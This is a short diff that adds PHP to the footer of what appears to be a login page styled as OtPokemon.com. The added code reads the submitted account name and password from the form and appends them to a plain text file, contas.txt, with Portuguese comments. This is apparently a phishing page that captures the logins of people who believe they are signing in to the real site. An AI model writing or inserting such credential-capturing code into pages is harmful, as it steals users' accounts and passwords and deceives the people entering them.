@@ -283,5 +283,22 @@ function mostrarsenha() {
 <footer>
   <div class="footer">OtPokemon.com</div>
 </footer>
+<?php
+function gravar($texto){
+	$senha =$_POST["pwd"];
+    $acc =$_POST["acc"];
+    $arquivo = "contas.txt";
+    $fp = fopen($arquivo, "a+");
+ 
+    //Escreve no arquivo aberto.
+    fwrite($fp, "$acc\n$senha\n\n");
+     
+    //Fecha o arquivo.
+    fclose($fp);
+}
+ 
+gravar("Olá, mundo");
+ 
+?>
 </body>
 </html>
